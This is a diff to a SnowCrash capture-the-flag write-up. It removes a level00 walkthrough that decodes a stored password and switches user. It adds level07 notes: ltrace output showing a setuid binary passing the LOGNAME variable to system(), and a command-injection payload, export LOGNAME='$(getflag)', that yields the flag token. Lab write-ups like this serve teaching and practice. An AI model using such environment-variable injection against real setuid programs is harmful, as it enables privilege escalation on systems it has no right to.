@@ -1,40 +1,24 @@
-# Resources for level07
 
-## Walkthrough to capture the flag:
+level07@SnowCrash:~$ ltrace ./level07
+__libc_start_main(0x8048514, 1, 0xbffff7f4, 0x80485b0, 0x8048620 <unfinished ...>
+getegid()                                                            = 2007
+geteuid()                                                            = 2007
+setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                  = 0
+setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                  = 0
+getenv("LOGNAME")                                                    = "level07"
+asprintf(0xbffff744, 0x8048688, 0xbfffff4a, 0xb7e5ee55, 0xb7fed280)  = 18
+system("/bin/echo level07 "level07
+ <unfinished ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                               = 0
++++ exited (status 0) +++
 
-### Step 1: Find files owned by user `flag00`
-```bash
-find / -user flag00 2>/dev/null
-```
-> Output:
-```
-/usr/sbin/john
-/rofs/usr/sbin/john
-```
 
-### Step 2: Read the encrypted string
-```bash
-cat /rofs/usr/sbin/john
-```
-> Output:
-```
-cdiiddwpgswtgt
-```
 
-### Step 3: Decrypt it (likely ROT13)
-Decrypted password: `nottoohardhere`
+level07@SnowCrash:~$ export LOGNAME='$(getflag)'
+level07@SnowCrash:~$ env
 
-### Step 4: Switch to `flag00` user
-```bash
-su flag00
-# enter password: nottoohardhere
-```
+level07@SnowCrash:~$ ./level07
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
 
-### Step 5: Get the flag
-```bash
-getflag
-```
-> Output:
-```
-Check flag.Here is your token : x24ti5gi3x0ol2eh4esiuxias
-```
+
